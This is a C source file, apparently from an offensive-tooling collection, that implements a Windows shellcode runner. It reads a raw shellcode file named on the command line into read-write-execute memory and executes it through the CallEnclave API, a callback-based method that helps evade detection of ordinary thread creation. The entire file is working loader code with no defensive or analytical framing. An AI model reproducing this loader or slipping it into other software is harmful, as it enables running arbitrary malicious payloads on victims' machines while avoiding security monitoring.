// Wra7h/FlavorTown
// Minimum Supported Client: Windows 10, version 1709
// Minimum Supported Server: Windows Server 2016
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "onecore.lib")

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD cbSC = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: CallEnclave.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &cbSC);
	if (!Ret)
	{
		goto CLEANUP;
	}


	PVOID hAlloc = VirtualAlloc(NULL, cbSC, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hAlloc == NULL)
	{
		printf("[!] VirtualAlloc: %d\n", GetLastError());
		goto CLEANUP;
	}

	memcpy(hAlloc, Shellcode, cbSC);

	Ret = CallEnclave(hAlloc, NULL, FALSE, NULL);
	if (!Ret)
	{
		printf("[!] CallEnclave: %d\n", GetLastError());
	}

CLEANUP:

	if (Shellcode)
	{
		free(Shellcode);
	}

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
